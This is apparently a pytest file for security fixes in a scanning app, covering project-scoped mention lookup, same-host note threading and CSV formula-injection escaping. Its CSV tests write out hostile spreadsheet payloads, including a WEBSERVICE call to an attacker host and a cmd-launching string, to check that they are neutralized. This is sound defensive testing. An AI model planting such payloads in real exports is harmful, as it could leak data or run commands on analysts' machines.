"""Targeted tests for the v2.48.2 security fixes.

* H1 — ``parse_mentions`` scopes username resolution to the note's own
  project (was global, leaking Project A context to a Project B-only
  user).
* H2 — ``HostFollowService.create_note`` rejects a ``parent_id`` that
  points at a note on a different host (was unvalidated, letting a
  Project A note thread under a Project B note).
* H3 — ``_csv_safe`` neutralizes spreadsheet-formula prefixes so a
  malicious hostname / vuln title / scan filename can't run as a
  formula when an analyst opens the export.
"""

from __future__ import annotations

from datetime import datetime, timezone

import pytest


# ---------------------------------------------------------------------------
# H3 — pure-function tests
# ---------------------------------------------------------------------------


def test_csv_safe_prefixes_dangerous_starts():
    from app.api.v1.endpoints.reports import _csv_safe

    # Each of the formula-injection prefixes Excel / LibreOffice treat
    # as a formula start.
    assert _csv_safe('=WEBSERVICE("https://attacker.tld/")') == (
        '\'=WEBSERVICE("https://attacker.tld/")'
    )
    assert _csv_safe("+1+1") == "'+1+1"
    assert _csv_safe("-cmd|/c calc") == "'-cmd|/c calc"
    assert _csv_safe("@SUM(A1:A2)") == "'@SUM(A1:A2)"
    assert _csv_safe("\tinjection") == "'\tinjection"
    assert _csv_safe("\rinjection") == "'\rinjection"


def test_csv_safe_passes_safe_values_through():
    from app.api.v1.endpoints.reports import _csv_safe

    assert _csv_safe("nginx") == "nginx"
    assert _csv_safe("10.0.0.5") == "10.0.0.5"
    assert _csv_safe(443) == "443"
    assert _csv_safe(None) == ""
    # Embedded `=` later in the string is NOT a formula trigger — only
    # the first character matters to a spreadsheet, so leave it alone.
    assert _csv_safe("a=b") == "a=b"


# ---------------------------------------------------------------------------
# H2 — parent_id same-host validation
# ---------------------------------------------------------------------------


def _make_host(db_session, project, ip_address):
    from app.db import models

    host = models.Host(
        project_id=project.id,
        ip_address=ip_address,
        state="up",
        first_seen=datetime.now(timezone.utc),
        last_seen=datetime.now(timezone.utc),
    )
    db_session.add(host)
    db_session.flush()
    return host


def test_create_note_rejects_cross_host_parent_id(
    db_session, test_project, test_user
):
    """A parent_id that points at a note on a *different* host (and
    therefore potentially a different project) must be refused — that
    was the cross-project notification-injection path."""
    from app.services.host_follow_service import HostFollowService

    host_a = _make_host(db_session, test_project, "10.0.0.5")
    host_b = _make_host(db_session, test_project, "10.0.0.6")
    db_session.commit()

    svc = HostFollowService(db_session)
    parent = svc.create_note(host_b.id, test_user.id, "parent on host B")

    with pytest.raises(ValueError, match="same host"):
        svc.create_note(
            host_a.id, test_user.id, "child on host A", parent_id=parent.id
        )


def test_create_note_accepts_parent_on_same_host(
    db_session, test_project, test_user
):
    from app.services.host_follow_service import HostFollowService

    host = _make_host(db_session, test_project, "10.0.0.7")
    db_session.commit()

    svc = HostFollowService(db_session)
    parent = svc.create_note(host.id, test_user.id, "parent")
    child = svc.create_note(
        host.id, test_user.id, "child", parent_id=parent.id
    )
    assert child.parent_id == parent.id


def test_create_note_no_parent_id_works_unchanged(
    db_session, test_project, test_user
):
    """Parent-less notes (the common case) are unaffected by the new
    validation."""
    from app.services.host_follow_service import HostFollowService

    host = _make_host(db_session, test_project, "10.0.0.8")
    db_session.commit()

    note = HostFollowService(db_session).create_note(
        host.id, test_user.id, "standalone"
    )
    assert note.parent_id is None


# ---------------------------------------------------------------------------
# H1 — parse_mentions scoped to project membership
# ---------------------------------------------------------------------------


def _make_user(db_session, username):
    from app.db.models_auth import User, UserRole

    # Hash chosen by tests/conftest.py for its TEST_USER_PW_HASH; here
    # we just need a populated value so the column is non-null.
    user = User(
        username=username,
        email=f"{username}@example.com",
        full_name=username.title(),
        hashed_password="$2b$12$abcdefghijklmnopqrstuv",
        role=UserRole.MEMBER,
        is_active=True,
        is_verified=True,
        created_at=datetime.now(timezone.utc),
    )
    db_session.add(user)
    db_session.flush()
    return user


def _make_membership(db_session, project, user, role="analyst"):
    from app.db.models_project import ProjectMembership

    mem = ProjectMembership(project_id=project.id, user_id=user.id, role=role)
    db_session.add(mem)
    db_session.flush()
    return mem


def test_parse_mentions_returns_only_project_members(
    db_session, test_project, test_user
):
    """Mention resolution must JOIN ProjectMembership so a username only
    active in *another* project is not returned."""
    from app.db.models_project import Project
    from app.services.notification_service import NotificationService

    # alice belongs to test_project; bob belongs only to other_project.
    alice = _make_user(db_session, "alice")
    bob = _make_user(db_session, "bob")
    _make_membership(db_session, test_project, alice)

    other_project = Project(
        name="other-project",
        slug="other-project",
        description="adversarial scope",
    )
    db_session.add(other_project)
    db_session.flush()
    _make_membership(db_session, other_project, bob)
    db_session.commit()

    svc = NotificationService(db_session)
    resolved = svc.parse_mentions(
        "@alice please look · @bob check this", project_id=test_project.id
    )
    usernames = {u.username for u in resolved}
    assert "alice" in usernames, "project member must be resolved"
    assert (
        "bob" not in usernames
    ), "non-member must NOT be resolved — would leak project context"


def test_parse_mentions_ignores_inactive_members(
    db_session, test_project
):
    from app.services.notification_service import NotificationService

    inactive = _make_user(db_session, "inactive_user")
    inactive.is_active = False
    _make_membership(db_session, test_project, inactive)
    db_session.commit()

    svc = NotificationService(db_session)
    resolved = svc.parse_mentions(
        "@inactive_user", project_id=test_project.id
    )
    assert resolved == []


def test_parse_mentions_empty_body_returns_empty():
    """Edge case — empty / mention-less body skips the DB query
    entirely."""
    from app.services.notification_service import NotificationService

    # No DB needed for the early-return paths.
    svc = NotificationService(db=None)
    assert svc.parse_mentions("", project_id=1) == []
    assert svc.parse_mentions("no mentions here", project_id=1) == []
